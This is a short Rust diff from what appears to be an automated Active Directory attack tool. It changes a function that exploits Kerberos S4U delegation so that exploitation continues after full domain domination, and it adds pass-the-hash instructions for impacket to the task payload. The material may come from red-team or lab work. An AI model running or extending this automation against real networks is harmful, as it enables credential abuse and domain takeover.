@@ -116,9 +116,13 @@ pub async fn auto_s4u_exploitation(
         let work: Vec<S4uWork> = {
             let state = dispatcher.state.read().await;
 
-            // Skip only when ALL forests are dominated — delegation vulns
-            // in undominated forests must still be exploited after initial DA.
-            if state.has_domain_admin && state.all_forests_dominated() {
+            // Skip only when ALL forests are dominated AND strategy says to stop.
+            // When continue_after_da is true, keep exploiting delegation vulns
+            // for path diversity even after full domination.
+            if state.has_domain_admin
+                && state.all_forests_dominated()
+                && !dispatcher.config.strategy.should_continue_after_da()
+            {
                 continue;
             }
 
@@ -255,6 +259,10 @@ pub async fn auto_s4u_exploitation(
             } else if let Some(ref hash) = item.hash {
                 payload["hash"] = json!(hash.hash_value);
                 payload["username"] = json!(hash.username);
+                payload["auth_method"] = json!("hash");
+                payload["note"] = json!(
+                    "Use --hashes with the NTLM hash for authentication. Do NOT pass an empty password or impacket will prompt interactively and crash."
+                );
                 if let Some(ref aes) = hash.aes_key {
                     payload["aes_key"] = json!(aes);
                 }
